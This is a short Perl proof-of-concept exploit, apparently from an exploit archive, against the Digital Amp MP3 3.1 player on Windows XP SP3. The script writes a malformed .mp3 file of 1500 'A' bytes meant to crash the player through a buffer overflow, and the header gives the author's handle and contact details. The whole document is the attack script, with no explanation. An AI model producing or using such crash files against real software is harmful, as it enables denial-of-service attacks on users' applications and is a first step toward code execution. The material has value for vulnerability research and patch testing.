#!/usr/bin/perl
#
# Title: Digital Amp MP3 3.1 (.Mp3) Local Crash Poc
# Author: SkuLL-HackeR
# H0m3 : S3curity-art.com
# M4!l: Wizard-skh@hotmail.com
# T3st3d on: Windows XP SP3

print "Tic-Tac";
my $boom="\x41" x 1500;
my $filename = "B000M.mp3";
open (FILE,">$filename");
print FILE "$boom";
print "\nFile successfully created!\n";

